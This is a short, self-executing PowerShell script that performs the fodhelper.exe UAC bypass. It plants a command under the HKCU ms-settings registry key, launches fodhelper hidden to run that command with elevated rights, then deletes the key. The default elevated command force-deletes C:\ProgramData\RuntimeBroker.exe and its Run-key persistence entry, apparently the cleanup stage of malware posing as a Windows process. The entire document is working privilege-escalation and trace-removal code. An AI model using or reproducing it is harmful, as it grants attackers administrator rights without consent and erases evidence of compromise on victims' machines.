function FodhelperBypass(){
    Param (
        [String]$program = "cmd /c del /F /Q C:\ProgramData\RuntimeBroker.exe && reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v RuntimeBroker /f"
    )

    # Create registry structure for UAC bypass
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

    # Perform the bypass by launching fodhelper.exe
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    # Remove registry structure used for the bypass
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}

# Execute the function
FodhelperBypass
